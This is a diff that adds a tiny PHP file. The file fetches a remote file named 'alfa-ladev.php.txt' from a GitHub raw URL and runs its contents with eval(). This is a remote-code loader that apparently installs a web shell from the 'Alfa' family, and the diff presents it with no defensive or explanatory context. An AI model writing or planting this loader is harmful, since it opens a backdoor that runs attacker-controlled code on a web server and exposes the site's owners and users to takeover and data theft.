@@ -1,0 +1,6 @@
+<?php
+
+$content = file_get_contents(urldecode('https://raw.githubusercontent.com/okewlalocksystem-tech/BELAWAN/refs/heads/main/alfa-ladev.php.txt'));
+
+$content = "?> ".$content;
+eval($content);
